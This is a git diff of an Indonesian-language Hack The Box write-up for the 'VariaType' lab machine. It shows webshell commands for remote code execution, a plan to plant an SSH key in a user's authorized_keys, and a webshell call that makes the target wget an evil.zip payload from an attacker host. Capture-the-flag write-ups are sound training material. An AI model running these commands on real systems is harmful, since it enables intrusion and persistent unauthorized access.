@@ -58,9 +58,10 @@ sudo openvpn ~/Downloads/OpenVPN/variatype.ovpn
 ```
 
 ![Koneksi VPN ke Hack The Box berhasil](gambar/02-vpn-connect_01.png)
+
 ![Koneksi VPN ke Hack The Box berhasil_02](gambar/02-vpn-connect_02.png)
 
-Setelah koneksi VPN aktif, mesin VariaType dinyalakan dan sistem mengalokasikan alamat IP target: **10.129.11.170**.
+Setelah koneksi VPN aktif, mesin VariaType dinyalakan dan sistem mengalokasikan alamat IP target: **10.129.42.177**.
 
 ![Mesin VariaType aktif dengan IP yang ditetapkan](gambar/03-machine-started.png)
 
@@ -258,6 +259,7 @@ File `source-light.ttf` dan `source-regular.ttf` berhasil dibuat. Selanjutnya, s
 	</variable-fonts>
 </designspace>
 ```
+(isi file `malicious2.designspace`)
 
 Tujuan dari konstruksi ini adalah mengeksploitasi pipeline pemrosesan font untuk menulis file PHP berisi webshell langsung ke dalam web root server, membuka jalan menuju eksekusi perintah dari jarak jauh.
 
@@ -282,8 +284,6 @@ Server merespons dengan pesan **"Processing completed"**, menandakan bahwa paylo
 curl -i -b "PHPSESSID=q4da62f7c63pkeu0026dcrs8r4" "http://portal.variatype.htb/files/shell.php?cmd=id" --output hasil_rce.txt
 ```
 
-![Pembuatan SSH key pair untuk user steve](gambar/17-ssh-keygen.png)
-
 ---
 
 ```bash
@@ -292,7 +292,7 @@ ssh-keygen -t ed25519 -f steve_key -N "" -C "steve_variatype"
 
 Proses ini menghasilkan dua file: `steve_key` (private key) dan `steve_key.pub` (public key) tanpa passphrase.
 
-![Pembuatan SSH key steve](gambar/pembuatan_ssh_steve.png)
+![Pembuatan SSH key steve](gambar/17-pembuatan_ssh_steve.png)
 
 Rencana selanjutnya adalah menyuntikkan public key tersebut ke dalam file `~/.ssh/authorized_keys` milik `steve` melalui RCE yang sudah dimiliki, sehingga login SSH tanpa password bisa dilakukan kapan saja.
 
@@ -323,7 +323,7 @@ python3 -m http.server 80
 Dari log server, terlihat permintaan `GET /evil.zip` masuk — bukti bahwa target berhasil mengambil file tersebut. Namun untuk memastikan payload benar-benar tersalin ke lokasi yang diproses oleh scheduled task, webshell digunakan untuk secara eksplisit mengunduhnya ke server:
 
 ```bash
-curl "http://portal.variatype.htb/public/files/shell.php?cmd=wget+http://10.10.14.X:8080/evil.zip+-O+/var/www/portal.variatype.htb/uploads/evil.zip"
+curl -I -b "PHPSESSID=q4da62f7c63pkeu0026dcrs8r4" "http://portal.variatype.htb/files/shell.php?cmd=wget%20http://10.10.14.3/evil.zip%20/var/www/portal.variatype.htb/public/files/ev1l.zip" --output hasil_rce.txt
 ```
 
 ![Payload evil.zip berhasil diunduh ke direktori target melalui webshell](gambar/20-payload-delivery.png)
